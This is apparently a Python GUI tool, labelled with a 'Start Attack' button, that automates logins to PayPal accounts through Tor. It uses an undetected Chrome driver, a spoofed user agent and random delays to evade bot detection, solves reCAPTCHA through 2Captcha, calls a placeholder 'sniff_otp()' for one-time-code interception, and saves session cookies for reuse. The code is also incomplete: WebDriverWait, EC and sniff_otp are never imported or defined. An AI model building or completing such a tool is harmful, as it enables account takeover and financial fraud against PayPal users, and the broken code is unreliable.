import time
import random
import json
import requests
import tkinter as tk
from tkinter import ttk
from selenium import webdriver
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.chrome.options import Options as ChromeOptions
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.webdriver import WebDriver
import undetected_chromedriver.v2 as uc
import webbrowser

# ---------- CONFIGURATION ----------
SESSION_COOKIE_FILE = "paypal_cookies.json"
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
PROXY = "socks5://127.0.0.1:9050"  # Tor SOCKS5 (ensure Tor is running)
API_KEY = "YOUR_2CAPTCHA_API_KEY"  # 2Captcha API key

# ---------- GUI FUNCTIONS ----------
def update_progress(step, total_steps):
    progress['value'] = (step / total_steps) * 100
    window.update_idletasks()

def show_message(message):
    message_label.config(text=message)
    window.update_idletasks()

# ---------- LOAD & SAVE COOKIES ----------
def save_cookies(driver, filename):
    with open(filename, "w") as file:
        json.dump(driver.get_cookies(), file)

def load_cookies(driver, filename):
    try:
        with open(filename, "r") as file:
            cookies = json.load(file)
        for cookie in cookies:
            driver.add_cookie(cookie)
        driver.refresh()
    except FileNotFoundError:
        show_message("[!] No saved session found. Logging in manually.")

# ---------- CAPTCHA SOLVING FUNCTION ----------
def solve_captcha(captcha_site_key, page_url):
    payload = {
        'method': 'userrecaptcha',
        'googlekey': captcha_site_key,
        'key': API_KEY,
        'pageurl': page_url,
    }
    response = requests.post('http://2captcha.com/in.php', data=payload)
    if response.text.startswith('OK'):
        captcha_id = response.text.split('|')[1]
        time.sleep(20)
        solution = requests.get(f'http://2captcha.com/res.php?key={API_KEY}&action=get&id={captcha_id}')
        if solution.text.startswith('OK'):
            return solution.text.split('|')[1]
    return None

# ---------- STEALTH FUNCTIONS ----------
def stealth_delay():
    time.sleep(random.uniform(2, 5))  # Simulate random delays between actions

def configure_stealth_options():
    options = ChromeOptions()
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument(f"--user-agent={USER_AGENT}")
    options.add_argument(f"--proxy-server={PROXY}")
    return options

# ---------- BROWSER AUTOMATION ATTACK ----------
def browser_automation_attack(email, password):
    options = configure_stealth_options()
    driver = uc.Chrome(options=options)
    driver.get("https://www.paypal.com/signin")
    stealth_delay()

    # Load cookies if available
    load_cookies(driver, SESSION_COOKIE_FILE)

    # Wait for the email input field to be available
    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "login_email")))

    if "summary" in driver.current_url:
        show_message("[+] Session restored successfully!")
        return driver

    # Enter email
    email_input = driver.find_element(By.NAME, "login_email")
    email_input.send_keys(email)
    stealth_delay()

    # Wait for the 'Next' button to be clickable and click it
    WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.ID, "btnNext")))
    next_button = driver.find_element(By.ID, "btnNext")
    next_button.click()
    stealth_delay()

    update_progress(2, 6)
    show_message("Entering Password...")

    # Wait for the password input field to be available
    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "login_password")))

    # Enter password and make it visible
    password_input = driver.find_element(By.NAME, "login_password")
    driver.execute_script("arguments[0].setAttribute('type', 'text')", password_input)  # Show password
    password_input.send_keys(password)
    stealth_delay()

    update_progress(3, 6)
    show_message("Logging in...")

    # Wait for the 'Login' button to be clickable and click it
    WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.ID, "btnLogin")))
    login_button = driver.find_element(By.ID, "btnLogin")
    login_button.click()
    stealth_delay()

    update_progress(4, 6)
    show_message("Waiting for OTP...")

    # OTP Interception (Simulated in this script)
    otp_code = sniff_otp()  # Placeholder function for OTP interception (if applicable)
    if otp_code:
        # Wait for the OTP input field to be available
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "otp")))
        otp_input = driver.find_element(By.NAME, "otp")
        otp_input.send_keys(otp_code)
        otp_input.send_keys(Keys.RETURN)
        stealth_delay()

    update_progress(5, 6)
    show_message("Finalizing...")

    # Check if login was successful
    if "summary" in driver.current_url:
        show_message("[+] Login successful! Saving session cookies.")
        save_cookies(driver, SESSION_COOKIE_FILE)
        update_progress(6, 6)
        show_message("[+] Login successful! Open in Browser")
        webbrowser.open(driver.current_url)
    else:
        show_message("[-] Login failed.")

    return driver

# ---------- GUI SETUP ----------
def start_attack():
    email = email_entry.get()
    password = password_entry.get()
    
    show_message("Starting automation...")
    driver = browser_automation_attack(email, password)
    if driver:
        show_message("Session is now active. Opening PayPal in browser.")
        driver.quit()

# ---------- GUI WINDOW ----------
window = tk.Tk()
window.title("PayPal Automation Tool")

# Email entry
email_label = tk.Label(window, text="Enter PayPal email:")
email_label.pack(pady=5)
email_entry = tk.Entry(window, width=40)
email_entry.pack(pady=5)

# Password entry
password_label = tk.Label(window, text="Enter PayPal password:")
password_label.pack(pady=5)
password_entry = tk.Entry(window, width=40, show="*")
password_entry.pack(pady=5)

# Start attack button
start_button = tk.Button(window, text="Start Attack", command=start_attack)
start_button.pack(pady=10)

# Progress bar
progress = ttk.Progressbar(window, orient="horizontal", length=300, mode="determinate")
progress.pack(pady=10)

# Message label
message_label = tk.Label(window, text="", fg="green")
message_label.pack(pady=10)

# Run GUI
window.mainloop()
